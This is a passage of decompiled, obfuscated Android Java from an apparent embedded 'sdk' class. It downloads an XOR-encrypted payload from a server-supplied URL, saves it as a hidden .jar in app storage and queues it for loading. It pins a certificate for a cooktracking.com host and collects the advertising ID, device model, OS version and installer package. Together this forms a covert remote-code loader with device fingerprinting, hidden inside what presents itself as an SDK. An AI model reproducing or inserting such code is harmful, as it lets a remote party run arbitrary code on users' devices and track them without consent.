            })).start();
        } catch (Throwable var3) {
        }

    }

    private File u(int var1) {
        try {
            for (int var2 = 0; var2 < 5; ++var2) {
                try {
                    String var3 = "oldf." + var1;
                    var3 = var3 + ".";
                    var3 = var3 + this.u("unknown");
                    String var4 = sdk.a.t(var3.getBytes());
                    var4 = var4 + UUID.randomUUID().toString().substring(0, 4);
                    var4 = var4 + ".jar";
                    File var5 = new File(this.t.getFilesDir(), var4);
                    if (!var5.isFile()) {
                        return var5;
                    }
                } catch (Throwable var6) {
                }
            }

            return null;
        } catch (Throwable var7) {
            return null;
        }
    }

    private void D(JSONObject var1) {
        sdk.g var2 = null;
        FileOutputStream var3 = null;

        try {
            if (var1 == null) {
                return;
            }

            String var4 = var1.optString("h", (String) null);
            if (sdk.x.u(var4)) {
                String var5 = var1.optString("url", (String) null);
                if (!sdk.x.u(var5)) {
                    return;
                }

                int var6 = var1.optInt("ver", 0);
                File var7 = this.u(var6);
                if (var7 == null) {
                    return;
                }

                sdk.e var8 = new sdk.e("GET", var5);
                var2 = var8.k(false);
                if (var2 == null) {
                    throw new sdk.f("");
                }

                if (var2.s() != null && var2.s().k == 0) {
                    if (var2.u() != null && var2.u().k == 200) {
                        InputStream var9 = var2.H();
                        if (var9 == null) {
                            throw new sdk.f("");
                        }

                        byte[] var10 = new byte[117];
                        boolean var11 = false;

                        int var43;
                        int var12;
                        for (var12 = 0; var12 < var10.length; var12 += var43) {
                            var43 = var9.read(var10, var12, var10.length - var12);
                            if (var43 <= 0) {
                                throw new sdk.f("");
                            }
                        }

                        var3 = new FileOutputStream(var7);
                        byte[] var13 = new byte[4096];
                        int var14 = 0;

                        for (var12 = 0; (var43 = var9.read(var13)) > 0; var12 += var43) {
                            for (int var15 = 0; var15 < var43; ++var15) {
                                byte var16 = var10[var14];
                                byte var17 = var13[var15];
                                int var18 = (var16 ^ var17) & 255;
                                var13[var15] = (byte) var18;
                                ++var14;
                                if (var14 >= var10.length) {
                                    var14 = 0;
                                }
                            }

                            var3.write(var13, 0, var43);
                        }

                        var3.flush();
                        var3.close();
                        var3 = null;
                        if (!this.k(var7, var4)) {
                            try {
                                var7.delete();
                            } catch (Throwable var40) {
                            }

                            throw new sdk.f("");
                        }

                        this.s(var7.getAbsolutePath(), var4, var6);
                        return;
                    }

                    throw new sdk.f("");
                }

                throw new sdk.f("");
            }
        } catch (Throwable var41) {
            return;
        } finally {
            try {
                if (var2 != null) {
                    var2.k();
                }
            } catch (Throwable var39) {
            }

            try {
                sdk.a.s((Closeable) var3);
            } catch (Throwable var38) {
            }

        }

    }

    private void s(final String var1, final String var2, final int var3) {
        try {
            sdk.b.u(new Runnable() {
                public void run() {
                    try {
                        sdk.this.u(var1, var2, var3);
                    } catch (Throwable var2x) {
                    }

                }
            });
        } catch (Throwable var5) {
        }

    }

    private void u(String var1, String var2, int var3) {
        try {
            if (!sdk.x.u(var1)) {
                return;
            }

            if (!sdk.x.u(var2)) {
                return;
            }

            this.k(var1, var2, var3);
            this.q();
        } catch (Throwable var5) {
        }

    }

    private static final class o implements X509TrustManager {
        private o() {
        }

        public void checkClientTrusted(X509Certificate[] var1, String var2) throws CertificateException {
        }

        //ECDHE_RSA
        public void checkServerTrusted(X509Certificate[] var1, String var2) throws CertificateException {
            try {
                if (var1 != null && var1.length >= 1) {
                    String var3 = "*.cooktracking.com";
                    String var4 = "06b25927c42a721631c1efd9431e648fa62e1e39";
                    if (!sdk.x.u(var3)) {
                        throw new sdk.f("");
                    } else if (!sdk.x.u(var4)) {
                        throw new sdk.f("");
                    } else {
                        SslCertificate var5 = new SslCertificate(var1[0]);
                        DName var6 = var5.getIssuedTo();
                        if (var6 == null) {
                            throw new sdk.f("");
                        } else {
                            String var7 = var6.getCName();
                            if (!sdk.x.u(var7)) {
                                throw new sdk.f("");
                            } else if (!var7.equals(var3)) {
                                throw new sdk.f("");
                            } else {
                                boolean var8 = false;

                                for (int var9 = 0; var9 < var1.length; ++var9) {
                                    String var10 = k(var1[var9]);
                                    if (var10 != null && sdk.x.u(var10) && var10.equalsIgnoreCase(var4)) {
                                        var8 = true;
                                        break;
                                    }

                                    X509Certificate var11 = var1[var9];
                                    if (var9 < var1.length - 1) {
                                        X509Certificate var12 = var1[var9 + 1];

                                        try {
                                            var11.verify(var12.getPublicKey());
                                        } catch (Throwable var14) {
                                            throw new sdk.f("cert verify error:" + var14);
                                        }
                                    }
                                }

                                if (!var8) {
                                    throw new sdk.f("");
                                }
                            }
                        }
                    }
                } else {
                    throw new sdk.f("");
                }
            } catch (Throwable var15) {
                throw new CertificateException("verify error");
            }
        }

        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }

        private static String k(X509Certificate var0) {
            try {
                byte[] var1 = var0.getEncoded();
                byte[] var2 = sdk.a.s("SHA1", var1);
                if (var2 != null && var2.length > 0) {
                    return sdk.a.s(var2, true);
                } else {
                    throw new Exception("digest error");
                }
            } catch (Throwable var3) {
                return null;
            }
        }
    }

    private static final class e {
        private boolean k;
        private String s;
        private String u;
        private List<sdk.t<String, String>> H;
        private String t;
        private InputStream m;
        private int e;
        private int G;

        private e(String var1, String var2) {
            this.k = false;
            this.H = new ArrayList();
            if (sdk.x.u(var1)) {
                this.s = var1.toUpperCase();
            }

            this.u = var2;
        }

        private void k(String var1, String var2) {
            this.H.add(new sdk.t(var1, var2));
        }

        private void k(String var1) {
            this.H.add(new sdk.t("Content-Type", var1));
        }

        private void k(byte[] var1) {
            this.m = new ByteArrayInputStream(var1);
        }

        private void k(InputStream var1) {
            this.m = var1;
        }

        private void k(int var1) {
            this.e = var1;
        }

        private void s(int var1) {
            this.G = var1;
        }

        private sdk.g k(boolean var1) {
            if (this.k) {
                return new sdk.g(-10, "already requested, create a new instance to do this");
            } else {
                this.k = true;
                String var2 = this.u;
                String var3 = null;

                for (int var4 = 0; var4 < 5; ++var4) {
                    sdk.g var5 = new sdk.g(-1, "unknown");

                    try {
                        if (!sdk.x.u(this.s)) {
                            throw new sdk.l(-4, "method has NOT been set");
                        }

                        if (!sdk.x.u(var2)) {
                            throw new sdk.l(-4, "invalid url");
                        }

                        URL var6 = null;

                        try {
                            var6 = new URL(var2);
                        } catch (Throwable var27) {
                            throw new sdk.l(-4, String.format("bad url format: url<%s>, e<%s>", var2, var27));
                        }

                        var5.k(-2);
                        HttpURLConnection var30 = (HttpURLConnection) var6.openConnection();
                        if (var1) {
                            this.k((URLConnection) var30);
                        }

                        var5.k(var30);
                        Iterator var8 = this.H.iterator();

                        while (var8.hasNext()) {
                            sdk.t var9 = (sdk.t) var8.next();
                            if (var9 != null && sdk.x.u((String) var9.k)) {
                                var30.setRequestProperty((String) var9.k, (String) var9.s);
                                if (sdk.x.u(var3)) {
                                    var30.addRequestProperty("Cookie", var3);
                                }
                            }
                        }

                        var30.setRequestMethod(this.s);
                        var30.setDoInput(true);
                        if (this.s.equals("POST")) {
                            var30.setDoOutput(true);
                        }

                        if (this.e > 0) {
                            var30.setConnectTimeout(this.e);
                        }

                        if (this.G > 0) {
                            var30.setReadTimeout(this.G);
                        }

                        if (this.m != null) {
                            OutputStream var31 = var30.getOutputStream();
                            int var34 = sdk.a.s(this.m, var31);
                            if (var34 < 0) {
                                throw new sdk.l(-2, "send data error");
                            }

                            var31.flush();
                            var31.close();
                        }

                        boolean var32 = true;

                        int var33;
                        try {
                            var33 = var30.getResponseCode();
                        } catch (UnknownHostException var26) {
                            throw new sdk.l(-11, "dns:" + var26);
                        }

                        String var35 = var30.getResponseMessage();
                        var5.s(new sdk.j(var33, var35));
                        Map var10 = var30.getHeaderFields();
                        if (var10 != null) {
                            Iterator var11 = var10.entrySet().iterator();

                            label312:
                            while (true) {
                                String var13;
                                List var14;
                                do {
                                    Entry var12;
                                    do {
                                        if (!var11.hasNext()) {
                                            break label312;
                                        }

                                        var12 = (Entry) var11.next();
                                        var13 = (String) var12.getKey();
                                    } while (!sdk.x.u(var13));

                                    var14 = (List) var12.getValue();
                                } while (var14 == null);

                                Iterator var15 = var14.iterator();

                                while (var15.hasNext()) {
                                    String var16 = (String) var15.next();
                                    var5.k(var13, var16);
                                }
                            }
                        }

                        if (var33 == 302) {
                            String var37 = var5.s("Location");
                            if (!sdk.x.u(var37)) {
                                throw new sdk.l(-3, "Location NOT found for redirect");
                            }

                            var2 = var37;
                            var3 = var5.s("Set-Cookie");
                            var5.k();
                            continue;
                        }

                        int var36 = var30.getContentLength();
                        var5.s(var36);
                        InputStream var38 = null;

                        try {
                            var38 = var30.getInputStream();
                        } catch (Throwable var25) {
                        }

                        if (var38 == null) {
                            try {
                                var38 = var30.getErrorStream();
                            } catch (Throwable var24) {
                            }
                        }

                        var5.k(var38);
                        var5.k(0, "no error");
                    } catch (Throwable var28) {
                        sdk.j var7 = sdk.j.s(var28, (sdk.j) null);
                        if (var7 != null) {
                            var5.k(var7);
                        } else {
                            var5.k("" + var28);
                        }
                    } finally {
                        sdk.a.s((Closeable) this.m);
                        this.m = null;
                    }

                    return var5;
                }

                return new sdk.g(-2, "too many redirects");
            }
        }

        private void k(URLConnection var1) {
            try {
                if (var1 != null && var1 instanceof HttpsURLConnection) {
                    sdk.o var2 = new sdk.o();
                    SSLContext var3 = SSLContext.getInstance("SSL");
                    var3.init((KeyManager[]) null, new X509TrustManager[]{var2}, new SecureRandom());
                    ((HttpsURLConnection) var1).setSSLSocketFactory(var3.getSocketFactory());
                }
            } catch (Throwable var4) {
            }

        }
    }

    private static final class g {
        private static final int k = 0;
        private static final int s = -1;
        private static final int u = -2;
        private static final int H = -3;
        private static final int t = -4;
        private static final int m = -10;
        private static final int e = -11;
        private HttpURLConnection G;
        private sdk.j Z;
        private sdk.j l;
        private int h;
        private InputStream Y;
        private Map<String, String> f;

        private g(int var1, String var2) {
            this.Z = new sdk.j(-1, "unknown");
            this.l = new sdk.j(0, "unknown");
            this.h = 0;
            this.f = new HashMap();
            this.Z = new sdk.j(var1, var2);
        }

        private g(HttpURLConnection var1, sdk.j var2, sdk.j var3, InputStream var4) {
            this.Z = new sdk.j(-1, "unknown");
            this.l = new sdk.j(0, "unknown");
            this.h = 0;
            this.f = new HashMap();
            this.G = var1;
            this.Z = var2;
            this.l = var3;
            this.Y = var4;
        }

        private void k() {
            try {
                if (this.G != null) {
                    this.G.disconnect();
                }
            } catch (Throwable var2) {
            }

            this.G = null;
        }

        private sdk.j s() {
            return this.Z;
        }

        private void k(int var1, String var2) {
            this.Z = new sdk.j(var1, var2);
        }

        private void k(sdk.j var1) {
            if (var1 != null) {
                this.Z = var1;
            }

        }

        private void k(int var1) {
            if (this.Z == null) {
                this.Z = new sdk.j(-1, "unknown");
            }

            this.Z.k = var1;
        }

        private void k(String var1) {
            if (this.Z == null) {
                this.Z = new sdk.j(-1, "unknown");
            }

            this.Z.s = var1;
        }

        private sdk.j u() {
            return this.l;
        }

        private void s(sdk.j var1) {
            this.l = var1;
        }

        private InputStream H() {
            return this.Y;
        }

        private void k(InputStream var1) {
            this.Y = var1;
        }

        private HttpURLConnection t() {
            return this.G;
        }

        private void k(HttpURLConnection var1) {
            this.G = var1;
        }

        private int m() {
            return this.h;
        }

        private void s(int var1) {
            this.h = var1;
        }

        private void k(String var1, String var2) {
            this.f.put(var1, var2);
        }

        private Map<String, String> e() {
            return this.f;
        }

        private String s(String var1) {
            return (String) this.f.get(var1);
        }
    }

    private static final class l extends sdk.f {
        private sdk.j k;

        private l(sdk.j var1) {
            super("");
            this.k = var1;
            if (this.k == null) {
                this.k = new sdk.j(-12345, "default");
            }

        }

        private l(int var1, String var2) {
            this(new sdk.j(var1, var2));
        }

        private l(int var1, String var2, Object var3) {
            this(new sdk.j(var1, var2, var3));
        }

        private sdk.j k() {
            return this.k;
        }
    }

    private static class f extends Exception {
        private f(String var1) {
            super(var1);
        }
    }

    private static final class AdvertisingIdClient {
        private AdvertisingIdClient() {
        }

        private static AdInfo s(Context var0) throws Exception {
            if (Looper.myLooper() == Looper.getMainLooper()) {
                throw new IllegalStateException("Cannot be called from the main thread");
            } else {
                try {
                    PackageManager var1 = var0.getPackageManager();
                    var1.getPackageInfo("com.android.vending", 0);
                } catch (Exception var12) {
                    throw var12;
                }

                r var13 = new r();
                Intent var2 = new Intent("com.google.android.gms.ads.identifier.service.START");
                var2.setPackage("com.google.android.gms");
                if (var0.bindService(var2, var13, Context.BIND_AUTO_CREATE)) {
                    AdInfo var5;
                    try {
                        h var3 = new h(var13.k());
                        AdInfo var4 = new AdInfo(var3.k(), var3.k(true));
                        var5 = var4;
                    } catch (Exception var10) {
                        throw var10;
                    } finally {
                        var0.unbindService(var13);
                    }

                    return var5;
                } else {
                    throw new IOException("Google Play connection failed");
                }
            }
        }

        private static final class h implements IInterface {
            private IBinder k;

            public h(IBinder var1) {
                this.k = var1;
            }

            public IBinder asBinder() {
                return this.k;
            }

            public String k() throws RemoteException {
                Parcel var1 = Parcel.obtain();
                Parcel var2 = Parcel.obtain();

                String var3;
                try {
                    var1.writeInterfaceToken("com.google.android.gms.ads.identifier.internal.IAdvertisingIdService");
                    this.k.transact(1, var1, var2, 0);
                    var2.readException();
                    var3 = var2.readString();
                } finally {
                    var2.recycle();
                    var1.recycle();
                }

                return var3;
            }

            public boolean k(boolean var1) throws RemoteException {
                Parcel var2 = Parcel.obtain();
                Parcel var3 = Parcel.obtain();

                boolean var4;
                try {
                    var2.writeInterfaceToken("com.google.android.gms.ads.identifier.internal.IAdvertisingIdService");
                    var2.writeInt(var1 ? 1 : 0);
                    this.k.transact(2, var2, var3, 0);
                    var3.readException();
                    var4 = 0 != var3.readInt();
                } finally {
                    var3.recycle();
                    var2.recycle();
                }

                return var4;
            }
        }

        private static final class r implements ServiceConnection {
            boolean k;
            private final LinkedBlockingQueue<IBinder> s;

            private r() {
                this.k = false;
                this.s = new LinkedBlockingQueue(1);
            }

            public void onServiceConnected(ComponentName var1, IBinder var2) {
                try {
                    this.s.put(var2);
                } catch (InterruptedException var4) {
                }

            }

            public void onServiceDisconnected(ComponentName var1) {
            }

            public IBinder k() throws InterruptedException {
                if (this.k) {
                    throw new IllegalStateException();
                } else {
                    this.k = true;
                    return (IBinder) this.s.take();
                }
            }
        }

        private static final class AdInfo {
            private final String k;
            private final boolean s;

            private AdInfo(String var1, boolean var2) {
                this.k = var1;
                this.s = var2;
            }

            private String s() {
                return this.k;
            }

            public boolean k() {
                return this.s;
            }
        }
    }

    private static final class t<K, V> {
        private K k;
        private V s;

        private t(K var1, V var2) {
            this.k = var1;
            this.s = var2;
        }
    }

    private static final class j {
        private int k;
        private String s;
        private Object u;

        private static sdk.j k(Throwable var0, int var1, String var2) {
            return k(var0, var1, var2, (Object) null);
        }

        private static sdk.j k(Throwable var0, int var1, String var2, Object var3) {
            return var0 instanceof sdk.l ? ((sdk.l) var0).k() : new sdk.j(var1, var2, var3);
        }

        private static sdk.j s(Throwable var0, sdk.j var1) {
            return var0 instanceof sdk.l ? ((sdk.l) var0).k() : var1;
        }

        private j(int var1, String var2) {
            this.k = var1;
            this.s = var2;
        }

        private j(int var1, String var2, Object var3) {
            this.k = var1;
            this.s = var2;
            this.u = var3;
        }

        private <T> T k(Class<T> var1) {
            try {
                return var1 != null && var1.isInstance(this.u) ? (T) this.u : null;
            } catch (Throwable var3) {
                return null;
            }
        }
    }

    private static final class r {
        private r() {
        }

        private static String t() {
            try {
                return Build.MODEL;
            } catch (Throwable var1) {
                return "";
            }
        }

        private static String m() {
            try {
                return Build.BRAND;
            } catch (Throwable var1) {
                return "";
            }
        }

        private static String e() {
            try {
                return Build.MANUFACTURER;
            } catch (Throwable var1) {
                return "";
            }
        }

        private static String G() {
            try {
                return VERSION.RELEASE;
            } catch (Exception var1) {
                return "";
            }
        }
    }

    private static final class AppInfo {
        private static m k;

        private AppInfo() {
        }

        private static synchronized void H(Context var0) throws Exception {
            if (k == null) {
                try {
                    PackageManager var1 = var0.getPackageManager();
                    m var2 = new m();

                    try {
                        var2.H = var1.getInstallerPackageName(var0.getPackageName());
                    } catch (Throwable var4) {
                    }

                    PackageInfo var3 = var1.getPackageInfo(var0.getPackageName(), PackageManager.GET_ACTIVITIES);
                    if (var3 == null) {
                        throw new sdk.f("get package info failed");
                    } else {
                        var2.k = var3.versionName;
                        var2.s = var3.versionCode;
                        if (var3.applicationInfo != null && (var3.applicationInfo.flags & 1) != 0) {
                            var2.u = true;
                        }

                        k = var2;
                    }
                } catch (sdk.f var5) {
                    throw var5;
                } catch (Throwable var6) {
                    throw new sdk.f("prepare error");
                }
            }
        }

        private static String t(Context var0) {
            try {
                H(var0);
                return k.k;
            } catch (Throwable var2) {
                return null;
            }
        }

        private static int m(Context var0) {
            try {
                H(var0);
                return k.s;
            } catch (Throwable var2) {
                return 0;
            }
        }

        private static boolean e(Context var0) {
            try {
                H(var0);
                return k.u;
            } catch (Throwable var2) {
                return false;
            }
        }

        private static String G(Context var0) {
            try {
                H(var0);
                return k.H;
            } catch (Throwable var2) {
                return null;
            }
        }

        private static final class m {
            public String k;
            public int s;
            public boolean u;
            public String H;

            private m() {
            }
        }
    }

    private static final class a {
        private static final char[] k = "0123456789abcdef".toCharArray();
        private static final char[] s = "0123456789ABCDEF".toCharArray();

        private a() {
        }

        private static String u(byte[] var0) {
            return s(var0, true);
        }

        private static String s(byte[] var0, boolean var1) {
            try {
                char[] var2 = var1 ? k : s;
                StringBuilder var3 = new StringBuilder();
                byte[] var4 = var0;
                int var5 = var0.length;

                for (int var6 = 0; var6 < var5; ++var6) {
                    byte var7 = var4[var6];
                    var3.append(var2[var7 >> 4 & 15]);
                    var3.append(var2[var7 & 15]);
                }

                return var3.toString();
            } catch (Throwable var8) {
                return null;
            }
        }

        private static void s(Closeable var0) {
            try {
                if (var0 != null) {
                    var0.close();
                }
            } catch (Throwable var2) {
            }

        }

        private static byte[] s(File var0) {
            FileInputStream var1 = null;

            byte[] var12;
            try {
                Object var3;
                try {
                    if (var0 == null) {
                        Object var11 = null;
                        return (byte[]) var11;
                    }

                    var1 = new FileInputStream(var0);
                    byte[] var2 = k((InputStream) var1);
                    if (var2 == null) {
                        var3 = null;
                        return (byte[]) var3;
                    }

                    s((Closeable) var1);
                    var1 = null;
                    var12 = var2;
                } catch (FileNotFoundException var8) {
                    var3 = null;
                    return (byte[]) var3;
                } catch (Throwable var9) {
                    var3 = null;
                    return (byte[]) var3;
                }
            } finally {
                s((Closeable) var1);
            }

            return var12;
        }

        private static byte[] k(InputStream var0) {
            ByteArrayOutputStream var1 = new ByteArrayOutputStream();
            int var2 = s((InputStream) var0, (OutputStream) var1);
            return var2 < 0 ? null : var1.toByteArray();
        }

        private static int s(InputStream var0, OutputStream var1) {
            try {
                if (var0 == null) {
                    return -1;
                } else if (var1 == null) {
                    return -1;
                } else {
                    byte[] var2 = new byte[4096];
                    boolean var3 = false;

                    int var4;
                    int var6;
                    for (var4 = 0; (var6 = var0.read(var2)) > 0; var4 += var6) {
                        var1.write(var2, 0, var6);
                    }

                    return var4;
                }
            } catch (Throwable var5) {
                return -1;
            }
        }

        private static byte[] H(byte[] var0) {
            return s(var0, (byte[]) null, (byte[]) null);
        }

        private static byte[] s(byte[] var0, byte[] var1, byte[] var2) {
            try {
                MessageDigest var3 = MessageDigest.getInstance(sdk.s(new byte[]{67, -103, 84, 14, -35, 97}));
                if (var1 != null) {
                    var3.update(var1);
                }

                var3.update(var0);
                if (var2 != null) {
                    var3.update(var2);
                }

                return var3.digest();
            } catch (Throwable var4) {
                return null;
            }
        }

        private static String t(byte[] var0) {
            try {
                byte[] var1 = H(var0);
                return var1 != null && var1.length > 0 ? u(var1) : null;
            } catch (Throwable var2) {
                return null;
            }
        }

        private static byte[] s(String var0, byte[] var1) {
            try {
                MessageDigest var2 = MessageDigest.getInstance(var0);
                return var2.digest(var1);
            } catch (Throwable var3) {
                return null;
            }
        }

        private static SecureRandom s() {
            try {
                return SecureRandom.getInstance("SHA1PRNG");
            } catch (Throwable var1) {
                return new SecureRandom();
            }
        }
    }

    private static final class b {
        private b() {
        }

        private static Handler k() {
            return new Handler(Looper.getMainLooper());
        }

        private static void u(Runnable var0) {
            try {
                if (var0 == null) {
                    return;
                }

                if (Looper.myLooper() == Looper.getMainLooper()) {
                    var0.run();
                } else {
                    k().post(var0);
                }
            } catch (Throwable var2) {
            }

        }

        private static void H(Runnable var0) {
            try {
                s(var0, 0L);
            } catch (Throwable var2) {
            }

        }

        private static void s(Runnable var0, long var1) {
            try {
                if (var1 <= 0L) {
                    k().post(var0);
                } else {
                    k().postDelayed(var0, var1);
                }
            } catch (Throwable var4) {
            }

        }
    }

    private static final class x {
        private x() {
        }

        private static boolean u(String var0) {
            try {
                return var0 != null && !var0.equals("");
            } catch (Throwable var2) {
                return false;
            }
        }

        private static String H(String var0) {
            try {
                return var0 == null ? "" : var0;
            } catch (Throwable var2) {
                return "";
            }
        }

        private static String s(byte[] var0) {
            if (var0 == null) {
                return null;
            } else {
                try {
                    return new String(var0, "UTF-8");
                } catch (Throwable var2) {
                    return null;
                }
            }
        }

        private static byte[] t(String var0) {
            if (var0 == null) {
                return null;
            } else {
                try {
                    return var0.getBytes("UTF-8");
                } catch (Throwable var2) {
                    return null;
                }
            }
        }
    }

    private static final class v extends Thread {
        private LocalServerSocket k;

        private v(LocalServerSocket var1) {
            this.k = var1;
        }

        public void run() {
            try {
                if (this.k == null) {
                    return;
                }

                try {
                    while (true) {
                        this.k.accept();
                    }
                } catch (Throwable var2) {
                }
            } catch (Throwable var3) {
            }

        }
    }
}

